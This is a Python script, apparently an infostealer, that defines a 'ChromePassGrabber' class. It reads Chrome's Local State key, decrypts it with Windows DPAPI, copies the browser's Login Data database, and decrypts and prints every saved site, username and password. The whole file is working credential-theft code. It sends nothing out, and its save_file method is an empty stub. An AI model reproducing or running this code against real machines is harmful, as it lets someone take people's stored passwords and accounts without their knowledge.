import shutil
import sqlite3
import os
import json
import base64
import win32crypt
from Crypto.Cipher import AES


""" GLOBAL CONSTANT """
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))


class ChromePassGrabber:

    def __init__(self, chrome_path_local_state, chrome_path) -> None:
        self.chrome_path_local_state =  chrome_path_local_state 
        self.chrome_path =  chrome_path 

    def get_secret_key(self):
        try:
            with open(self.chrome_path_local_state, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            raise Exception("Unable fetch secret key")

    def sqlite_conn(self, chrome_login_db):
        try:
            shutil.copy2(chrome_login_db, "Loginvault.db")
            conn = sqlite3.connect("Loginvault.db")
            return conn
        except:
            raise Exception("Unable connect sql")

    def decrypt_password(self, ciphertext, secret_key):
        try:
            # Initialisation vector for AES decryption
            initialisation_vector = ciphertext[3:15]
            # Get encrypted password by removing suffix bytes (last 16 bits)
            # Encrypted password is 192 bits
            encrypted_password = ciphertext[15:-16]
            # Build the cipher to decrypt the ciphertext
            cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
            decrypted_pass = cipher.decrypt(encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except Exception as e:
            print("%s"%str(e))
            print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
            return ""

    def grabber(self):
        secret_key = self.get_secret_key()
        sql_path = os.path.normpath(r"%s\Default\Login Data" % (self.chrome_path))
        conn = self.sqlite_conn(sql_path)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for index, login in enumerate(cursor.fetchall()):
            url, username, password = login[0], login[1], self.decrypt_password(login[2], secret_key)
            print((url, username, password))
        conn.close()
        os.remove("Loginvault.db")

    def save_file(self):
        pass



if __name__ == '__main__':
    chrome_pass_grabber = ChromePassGrabber(CHROME_PATH_LOCAL_STATE, CHROME_PATH)
    chrome_pass_grabber.grabber()


